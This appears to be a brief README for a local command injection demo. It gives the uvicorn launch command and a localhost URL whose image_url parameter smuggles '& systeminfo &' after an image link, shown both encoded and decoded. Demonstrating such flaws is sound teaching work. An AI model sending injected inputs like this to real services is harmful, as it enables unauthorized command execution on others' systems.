Command injection demo

uvicorn main:app --reload

http://127.0.0.1:8000/
http://127.0.0.1:8000/metadata/?image_url=https%3A%2F%2Fpaulinakita.com%2Fwp-content%2Fuploads%2F2023%2F09%2Fkwadrat3-1-768x775.jpg+1%3E+nul+%26+systeminfo+%26+echo+%22

https://paulinakita.com/wp-content/uploads/2023/09/kwadrat3-1-768x775.jpg 1> nul & systeminfo & echo "